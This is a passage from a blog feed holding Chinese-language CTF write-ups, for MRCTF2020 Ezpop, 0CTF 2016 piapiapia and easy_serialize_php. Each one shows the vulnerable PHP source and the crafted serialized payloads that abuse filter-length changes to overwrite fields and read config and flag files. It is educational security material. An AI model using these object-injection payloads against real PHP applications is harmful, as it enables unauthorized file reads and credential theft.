class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$m = <span class="keyword">new</span> Modifier();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$ss=<span class="keyword">new</span> Show();</span><br><span class="line">$s-&gt;source=$ss;</span><br><span class="line">$s-&gt;source-&gt;str=$t;</span><br><span class="line">$s-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> Modifier();</span><br><span class="line">$k = serialize($s);</span><br><span class="line"><span class="keyword">echo</span> urlencode($k);</span><br></pre></td></tr></table></figure><p>……ok</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;MRCTF2020-Ezpop&quot;&gt;&lt;a href=&quot;#MRCTF2020-Ezpop&quot; class=&quot;headerlink&quot; title=&quot;[MRCTF2020]Ezpop&quot;&gt;&lt;/a&gt;[MRCTF2020]Ezpop&lt;/h2&gt;&lt;p&gt;题目：&lt;/p&gt;
&lt;figure </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>0CTF-2016-piapiapia</title>
    <link href="http://example.com/2021/04/02/0CTF-2016-piapiapia/"/>
    <id>http://example.com/2021/04/02/0CTF-2016-piapiapia/</id>
    <published>2021-04-02T11:33:54.000Z</published>
    <updated>2021-04-02T12:15:51.276Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><p>进入网页发现是一个登录界面，尝试发现有register.php，登陆后有一个文件上传，有上传后的展示页面</p><p>御剑+dirmap扫，有访问控制，扫挺慢……</p><p><img src="/images/0CTF-2016-piapiapia/image-20210402193847592.png" alt="image-20210402193847592"></p><p>御剑扫出来register页面，dirmap就扫出来了网页备份……害</p><p>下载网页源码：<img src="/images/0CTF-2016-piapiapia/image-20210402194037537.png" alt="image-20210402194037537"></p><p>本题测试发现admin账户是可以注册的，应该不存在获取管理员权限啥的……看一波profile</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$email = $profile[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$nickname = $profile[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>这里有一个文件读取，上面是一个 反序列化，updata：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$file = $_FILES[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这里是序列化，将提交的信息进行了序列化，应该看一下user类里的有关方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params">$username, $new_profile</span>) </span>&#123;</span><br><span class="line">$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="built_in">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user有一个父类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//class mysql:</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对sql的一些查询语句进行了过滤，并会替换成hacker。</p><img src="/images/0CTF-2016-piapiapia/image-20210402195246499.png" alt="image-20210402195246499" style="zoom:80%;" /><p>config文件里记录了有flag信息，但这里是空的……我们应该是要读这个文件，也就是是控制传输的反序列化。</p><p>上次的easy_serialize_php，文件对序列化后的字符串进行了检测的替换。无论是检测时字符串删除或增加，都可能导致<strong>反序列化的对象逃逸</strong>，这里不能控制键，所以是值逃逸。</p><h3 id="反序列化的对象逃逸"><a href="#反序列化的对象逃逸" class="headerlink" title="反序列化的对象逃逸"></a>反序列化的对象逃逸</h3><p>首先</p><p><img src="/images/0CTF-2016-piapiapia/image-20210402200031174.png" alt="image-20210402200031174"></p><p>要绕过nickname的长度限制，这里可以使用数组绕过</p><p>正常的反序列化：</p><blockquote><p>a:4:{s:5:”phone”;s:11:”11111111111”;s:5:”email”;s:7:”<a href="mailto:&#x31;&#x40;&#x31;&#x2e;&#99;&#x6f;&#x6d;">&#x31;&#x40;&#x31;&#x2e;&#99;&#x6f;&#x6d;</a>“;s:8:”nickname”;a:1:{i:0;s:32:”1s:5:”photo”;s:10:”config.php”;}”;}s:5:”photo”;s:39:”upload/c4ca4238a0b923820dcc509a6f75849b”;}</p></blockquote><p>数组的反序列化会在数据两边加上<code>&#123;&#125;</code>，所以我们要拼接<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>来覆写photo为我们想要的config文件。</p><p>注意到过滤中有一个<code>where</code>是5字符的，而<code>hacker</code>是6字符，这样的增加可以影响到<strong>前面对数组的描述</strong>，而我们的插入因为符合语法规则而<strong>从描述中逃逸</strong>。<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>有34个字符，如果我们在nickname中传入34个where，将会被替换成64个hacker。</p><p><img src="/images/0CTF-2016-piapiapia/image-20210402200850354.png" alt="image-20210402200850354"></p><p>———————&gt;</p><p><img src="/images/0CTF-2016-piapiapia/image-20210402201033007.png" alt="image-20210402201033007"></p><p>本该解析的<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>被多出来的34个字符吞掉，后面正确闭合导致描述逃逸，photo被覆写为cofig.php：</p><p><img src="/images/0CTF-2016-piapiapia/image-20210402201316506.png" alt="image-20210402201316506"></p><p>成功上传：</p><p><img src="/images/0CTF-2016-piapiapia/image-20210402201348203.png" alt="image-20210402201348203"></p><p>解密：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;qwertyuiop&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;challenges&#x27;</span>;</span><br><span class="line">$flag = <span class="string">&#x27;flag&#123;f46c2977-0f1c-48f5-ac44-01b966e6c53a&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ok……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0CTF-2016-piapiapia&quot;&gt;&lt;a href=&quot;#0CTF-2016-piapiapia&quot; class=&quot;headerlink&quot; title=&quot;[0CTF 2016]piapiapia&quot;&gt;&lt;/a&gt;[0CTF 2016]piapiapia&lt;/h3&gt;&lt;p&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>easy_serialize_php</title>
    <link href="http://example.com/2021/04/01/easy-serialize-php/"/>
    <id>http://example.com/2021/04/01/easy-serialize-php/</id>
    <published>2021-04-01T05:24:52.000Z</published>
    <updated>2021-04-01T06:19:33.859Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目是一道关于session的反序列化</p><p>先看一下利用点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概是利用file_get_contents去读取flag文件，题目告诉我们phpinfo里有提示</p><p>（然而buu现在直接卡掉含有phpinfo的域名……</p><p><a href="https://blog.csdn.net/weixin_30547797/article/details/96985303">https://blog.csdn.net/weixin_30547797/article/details/96985303</a></p><p>可以找到敏感文件：<img src="/images/easy-serialize-php/image-20210401133133348.png" alt="image-20210401133133348"></p><p>然后就是session的序列化：</p><p><img src="/images/easy-serialize-php/image-20210401133204112.png" alt="image-20210401133204112"></p><p>extract($_POST);应该是通过post方式覆写变量，而反序列化读取的是$userinfo[‘img’]，也就是session[image]中的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果sha1,则不能再base64解码……若走第一条，内容则是指定的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br></pre></td></tr></table></figure><p>filter对序列化进行了过滤删除，构造使删除后序列化仍合法，有机会实现覆写：</p><h4 id="反序列化的对象逃逸"><a href="#反序列化的对象逃逸" class="headerlink" title="反序列化的对象逃逸"></a>反序列化的对象逃逸</h4><h5 id="值逃逸"><a href="#值逃逸" class="headerlink" title="值逃逸"></a>值逃逸</h5><p>控制序列化后的某个值为过滤字，过滤后根据规则，后面的字符会被解析进前面的键作为键值</p><p>再在后面闭合使其符合序列化语法：</p><p><img src="/images/easy-serialize-php/image-20210401135625213.png" alt="image-20210401135625213"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>这样提交后，flagflagflagflagflagflag被消除掉，取而代之的是<code>&quot;;s:8:&quot;function&quot;;s:1:&quot;a</code>，这样字符串就是合法的，后面img的值也就被覆盖了</p><h5 id="键逃逸"><a href="#键逃逸" class="headerlink" title="键逃逸"></a>键逃逸</h5><p><img src="/images/easy-serialize-php/image-20210401140644072.png" alt="image-20210401140644072"></p><p><img src="/images/easy-serialize-php/image-20210401140450430.png" alt="image-20210401140450430"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagphp]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>吃掉的正是对后面值的描述，这样控制好键的字数，就可以精确做到逃逸……大概……</p><p>这道题中决定逃逸的是，extract出现在img之前，user、function之后，不能通过直接覆写改变img，只能通过其他键（或构造特殊键），构造其中的键值来实现合法的反序列化字符串覆写，读取我们想要的文件。</p><p>……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;easy-serialize-php&quot;&gt;&lt;a href=&quot;#easy-serialize-php&quot; class=&quot;headerlink&quot; title=&quot;easy_serialize_php&quot;&gt;&lt;/a&gt;easy_serialize_php&lt;/h2&gt;&lt;figure c</summary>
      
    
    
    
    
  </entry>
  
</feed>
